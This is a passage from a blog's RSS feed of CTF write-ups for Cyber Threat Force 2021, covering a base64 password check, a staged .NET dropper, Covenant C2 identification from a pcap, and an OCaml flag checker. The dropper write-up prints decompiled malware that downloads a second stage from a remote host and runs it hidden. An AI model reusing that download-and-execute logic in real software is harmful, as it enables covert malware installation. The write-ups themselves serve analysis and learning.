&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">++&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">191&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">224&lt;/span> &lt;span style="color:#f92672">?&lt;/span> (&lt;span style="color:#a6e22e">c2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>),
&lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>((&lt;span style="color:#ae81ff">31&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">c2&lt;/span>),
&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#f92672">:&lt;/span> (&lt;span style="color:#a6e22e">c2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>),
&lt;span style="color:#a6e22e">c3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">r&lt;/span>.&lt;span style="color:#a6e22e">charCodeAt&lt;/span>(&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>),
&lt;span style="color:#a6e22e">t&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> String.&lt;span style="color:#a6e22e">fromCharCode&lt;/span>((&lt;span style="color:#ae81ff">15&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">12&lt;/span> &lt;span style="color:#f92672">|&lt;/span> (&lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">c2&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">63&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">c3&lt;/span>),
&lt;span style="color:#a6e22e">e&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">t&lt;/span>
}
}
, &lt;span style="color:#a6e22e">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> document.&lt;span style="color:#a6e22e">login&lt;/span>.&lt;span style="color:#a6e22e">password&lt;/span>.&lt;span style="color:#a6e22e">value&lt;/span>;
&lt;span style="color:#e6db74">&amp;#34;Q1lCRVJURntNMFIzX04zZzR0MXYzX3RoNG5fNF9wcjB0MG59&amp;#34;&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span>.&lt;span style="color:#a6e22e">encode&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>) &lt;span style="color:#f92672">?&lt;/span> (&lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Welcome to admin panel&amp;#34;&lt;/span>),
&lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">replace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;#34;&lt;/span>)) &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;wrong password&amp;#34;&lt;/span>)
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>That bottom string is compared with the password that we can enter, and looks like base64. Let&amp;rsquo;s try to decode it:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#a6e22e">atob&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;Q1lCRVJURntNMFIzX04zZzR0MXYzX3RoNG5fNF9wcjB0MG59&amp;#39;&lt;/span>)
&lt;span style="color:#e6db74">&amp;#34;CYBERTF{M0R3_N3g4t1v3_th4n_4_pr0t0n}&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And so we have our flag: &lt;code>CYBERTF{M0R3_N3g4t1v3_th4n_4_pr0t0n}&lt;/code>.&lt;/p>
&lt;p>Note that I didn&amp;rsquo;t flag this during the CTF, my teammate &lt;a href="https://ctftime.org/user/46515">R0ck3t&lt;/a> did.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/smasher">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Verify this</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-verify-this/</link><pubDate>Sat, 10 Jul 2021 00:00:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-verify-this/</guid><description>For this challenge, we were given a Stagged.exe executable. Before running it on our machine, we can try to run it against hybrid analysis, an online malware analysis service.
Here is the link to the full report.
We can see in the &amp;ldquo;Network Analysis&amp;rdquo; tab that the program made two requests:
HTTP Traffic&amp;rdquo; part of the report"
Trying to download the first image gives us a PE file. If we upload it again, we see that it also makes a request to /ordertoexecute.</description><content>&lt;p>For this challenge, we were given a &lt;code>Stagged.exe&lt;/code> executable. Before running it on our machine, we can try to run it against hybrid analysis, an online malware analysis service.&lt;/p>
&lt;p>Here is the &lt;a href="https://www.hybrid-analysis.com/sample/1a071c52e1c94be73f9a2aef069629d61b100e4a52701c7c0921f50211daa6e7/60e138f4125bb815b6267895">link to the full report&lt;/a>.&lt;/p>
&lt;p>We can see in the &amp;ldquo;Network Analysis&amp;rdquo; tab that the program made two requests:&lt;/p>
&lt;p>&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/reverse-verify-this-hybrid-analysis.png" alt="Screenshot of the &amp;ldquo;Network Analysis > HTTP Traffic&amp;rdquo; part of the report">&lt;/p>
&lt;p>Trying to download the first image gives us a PE file. If we upload it again, we see that it also makes a request to &lt;code>/ordertoexecute.gif&lt;/code>, so we can assume that &lt;code>Stagged.exe&lt;/code> doesn&amp;rsquo;t contain the &amp;ldquo;main&amp;rdquo; code, &lt;code>index.jpg&lt;/code> does.&lt;/p>
&lt;p>The name of the binary is fitting: &lt;code>Stagged.exe&lt;/code> probably refers to a &amp;ldquo;staged&amp;rdquo; malware, which downloads one or more stages that contains the actual nefarious code.&lt;/p>
&lt;p>We can take a look at the second image:&lt;/p>
&lt;p>&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/ordertoexecute.gif" alt="The second image, a GIF from star wars">&lt;/p>
&lt;p>Now this is where I stopped when I was doing the CTF. I tried a few steganography tools but none worked. &lt;a href="https://www.root-me.org/nobodyisnobody">Nobodyisnobody&lt;/a> found the tool that you had to use: &lt;a href="http://manpages.ubuntu.com/manpages/bionic/man1/stegosuite.1.html">stegosuite&lt;/a>.&lt;/p>
&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/stego-suite.png" alt="Stegosuite extracting the flag" class="center" />
&lt;p>The flag was &lt;code>CYBERTF{Gr3at_J0b_Ag3nt}&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>When I did not find any message encoded in the image, I started looking at the binary itself. It&amp;rsquo;s a Mono/.Net program, probably obfuscated using something like &lt;a href="https://www.gapotchenko.com/eazfuscator.net">Eazfuscator&lt;/a>. I say that because &lt;a href="https://github.com/icsharpcode/ILSpy">ILSpy&lt;/a>, a .NET decompiler, spits out mangled function names, encoded strings, &amp;hellip;&lt;/p>
&lt;p>The function responsible for downloading the second stage is this one:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cs" data-lang="cs">&lt;span style="color:#75715e">// \u0005\u2000
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">using&lt;/span> System;
&lt;span style="color:#66d9ef">using&lt;/span> System.Diagnostics;
&lt;span style="color:#66d9ef">using&lt;/span> System.Net;
&lt;span style="color:#66d9ef">using&lt;/span> System.Threading;
&lt;span style="color:#66d9ef">internal&lt;/span> &lt;span style="color:#66d9ef">sealed&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0005&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000
{
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#66d9ef">string&lt;/span>[] &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002)
{
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0003.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002())
{
&lt;span style="color:#66d9ef">string&lt;/span> text = &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443472&lt;/span>) + Environment.UserName + &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443456&lt;/span>);
&lt;span style="color:#66d9ef">string&lt;/span> text2 = &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443518&lt;/span>);
&lt;span style="color:#66d9ef">string&lt;/span> text3 = &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443500&lt;/span>);
&lt;span style="color:#66d9ef">string&lt;/span> text4 = &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443570&lt;/span>);
&lt;span style="color:#66d9ef">string&lt;/span> text5 = &lt;span style="color:#66d9ef">null&lt;/span>;
WebClient webClient = &lt;span style="color:#66d9ef">new&lt;/span> WebClient();
webClient.Headers.Set(&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443554&lt;/span>), &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443863&lt;/span>));
webClient.Headers.Add(&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443847&lt;/span>), &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443894&lt;/span>));
webClient.Headers.Add(&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443964&lt;/span>), &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443734&lt;/span>));
webClient.Headers.Add(&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443719&lt;/span>), &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443769&lt;/span>));
text5 = text3 + text4;
webClient.DownloadFile(text5, text + &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443757&lt;/span>) + text2);
Thread.Sleep(&lt;span style="color:#ae81ff">36000&lt;/span>);
Process.Start(&lt;span style="color:#66d9ef">new&lt;/span> ProcessStartInfo
{
CreateNoWindow = &lt;span style="color:#66d9ef">true&lt;/span>,
UseShellExecute = &lt;span style="color:#66d9ef">false&lt;/span>,
FileName = text + &lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0008&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u2000.&lt;span style="color:#960050;background-color:#1e0010">\&lt;/span>u0002(&lt;span style="color:#ae81ff">1179443757&lt;/span>) + text2,
WindowStyle = ProcessWindowStyle.Hidden
});
}
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now I could also have analyzed the second stage, a Go binary, but it is quite fat (6mb), so I stopped there.&lt;/p>
&lt;hr>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/verify-this">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Welcome to the matrix</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-welcome-to-the-matrix/</link><pubDate>Fri, 09 Jul 2021 22:31:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-welcome-to-the-matrix/</guid><description>For this challenge, we were given a pcapng file. The flag is meant to be CYBERTF{c2 framework used in leet speak}. Running strings on the capture, we see:
$ strings c2.pcapng ... 3d77 7o0~ b|}p l69s Covenant0 210520070857Z 310519070857Z0 Covenant0 ~vVz&amp;#34;/ loq5 ... Covenant is a well known C2 framework. The flag is CYBERTF{C0V3N4NT}.
You can view the sources on github or read other writeups.</description><content>&lt;p>For this challenge, we were given a pcapng file. The flag is meant to be &lt;code>CYBERTF{c2 framework used in leet speak}&lt;/code>. Running strings on the capture, we see:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ strings c2.pcapng
...
3d77
7o0~
b|&lt;span style="color:#f92672">}&lt;/span>p
l69s
Covenant0
210520070857Z
310519070857Z0
Covenant0
~vVz&lt;span style="color:#e6db74">&amp;#34;/
&lt;/span>&lt;span style="color:#e6db74">loq5
&lt;/span>&lt;span style="color:#e6db74">...
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;a href="https://github.com/cobbr/Covenant">Covenant&lt;/a> is a well known C2 framework. The flag is &lt;code>CYBERTF{C0V3N4NT}&lt;/code>.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/forensic/welcome-to-the-matrix">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Flag checker</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-flag-checker/</link><pubDate>Fri, 09 Jul 2021 00:01:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-flag-checker/</guid><description>For this challenge, we were given a program executable.
$ ./program ./program FLAG $ ./program MYFLAG failed Seems like it valides the flag that is passed as an argument. Let&amp;rsquo;s open the binary in Ghidra.
There are a lot of functions defined, and looking at the exports we see that quite a lot of them start with caml_. I didn&amp;rsquo;t know you could compile OCaml to C, that&amp;rsquo;s pretty neat.</description><content>&lt;p>For this challenge, we were given a &lt;code>program&lt;/code> executable.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ ./program
./program FLAG
$ ./program MYFLAG
failed
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Seems like it valides the flag that is passed as an argument. Let&amp;rsquo;s open the binary in Ghidra.&lt;/p>
&lt;p>There are a lot of functions defined, and looking at the exports we see that quite a lot of them start with &lt;code>caml_&lt;/code>. I didn&amp;rsquo;t know you could compile OCaml to C, that&amp;rsquo;s pretty neat.&lt;/p>
&lt;p>We can pinpoint the function that checks the flag by searching for strings. After looking for the event&amp;rsquo;s flag format, &lt;code>CYBERTF{...}&lt;/code>, we find a fake flag: &lt;code>CYBERTF{Not-S0Easy-Fake-Flag}&lt;/code>. One function references it:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined8 &lt;span style="color:#a6e22e">camlReverse__entry&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;span style="color:#66d9ef">long&lt;/span> lVar1;
byte bVar2;
&lt;span style="color:#66d9ef">long&lt;/span> lVar3;
camlReverse &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_caml_curry2_00160098;
DAT_00160150 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_caml_curry2_001600b8;
DAT_00160158 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_caml_curry2_001600d8;
DAT_00160160 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_camlReverse__char2int_207_001600f8;
DAT_00160168 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_camlReverse__string2char_211_00160110;
DAT_00160170 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>PTR_caml_curry2_00160128;
DAT_00160178 &lt;span style="color:#f92672">=&lt;/span> camlReverse__1;
DAT_00160180 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>camlReverse__9;
DAT_00160188 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>camlReverse__19;
DAT_00160190 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span>camlReverse__82;
lVar3 &lt;span style="color:#f92672">=&lt;/span> caml_c_call(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> ((&lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>) {
lVar3 &lt;span style="color:#f92672">=&lt;/span> caml_c_call(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x7ff&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)) {
camlReverse__string2char_211();
camlReverse__char2int_207();
lVar3 &lt;span style="color:#f92672">=&lt;/span> camlReverse__firstCheck_268();
&lt;span style="color:#66d9ef">if&lt;/span> (lVar3 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
camlStdlib__print_endline_361();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
lVar3 &lt;span style="color:#f92672">=&lt;/span> caml_c_call(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x7ff&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)) {
lVar1 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
bVar2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(byte &lt;span style="color:#f92672">*&lt;/span>)(&lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> lVar1);
lVar3 &lt;span style="color:#f92672">=&lt;/span> caml_c_call(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x7ff&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)) {
camlStdlib__bytes__sub_115((lVar1 &lt;span style="color:#f92672">-&lt;/span> (ulong)bVar2) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x13&lt;/span>);
camlStdlib__print_endline_361();
camlReverse__string2char_211();
camlReverse__char2int_207();
camlReverse__xor_103();
lVar3 &lt;span style="color:#f92672">=&lt;/span> camlReverse__listequal_92();
&lt;span style="color:#66d9ef">if&lt;/span> (lVar3 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
camlStdlib__print_endline_361();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
camlStdlib__print_endline_361();
camlStdlib__exit_459();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
}
}
}
&lt;span style="color:#66d9ef">else&lt;/span> {
&lt;span style="color:#75715e">/* no args: print(sys.argv[0] + &amp;#34; FLAG&amp;#34;) */&lt;/span>
lVar3 &lt;span style="color:#f92672">=&lt;/span> caml_c_call(&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#ae81ff">0x3ff&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(lVar3 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>)) {
camlStdlib__&lt;span style="color:#960050;background-color:#1e0010">$&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>e_136();
camlStdlib__print_endline_361();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
}
&lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
caml_ml_array_bound_error();
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can understand the general flow from the functions names alone. First:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Convert the passed flag from a string to (probably custom using structs) char array.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>camlReverse__string2char_211();
&lt;span style="color:#75715e">// Map each char to its int value.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>camlReverse__char2int_207();
&lt;span style="color:#75715e">// Execute some kind of check on these integer values.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>lVar3 &lt;span style="color:#f92672">=&lt;/span> camlReverse__firstCheck_268();
&lt;span style="color:#75715e">// Exit here after printing an error message if the check failed.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (lVar3 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) {
camlStdlib__print_endline_361();
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And then:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Subtract a value from some variable, probably shifting an array (the flag?).
&lt;/span>&lt;span style="color:#75715e">&lt;/span>camlStdlib__bytes__sub_115((lVar1 &lt;span style="color:#f92672">-&lt;/span> (ulong)bVar2) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x13&lt;/span>);
&lt;span style="color:#75715e">// Print something.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>camlStdlib__print_endline_361();
&lt;span style="color:#75715e">// Convert the flag to a char array.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>camlReverse__string2char_211();
&lt;span style="color:#75715e">// Once again, map each char to its int value.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>camlReverse__char2int_207();
&lt;span style="color:#75715e">// XOR the flag.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>camlReverse__xor_103();
&lt;span style="color:#75715e">// Compare it to some known value.
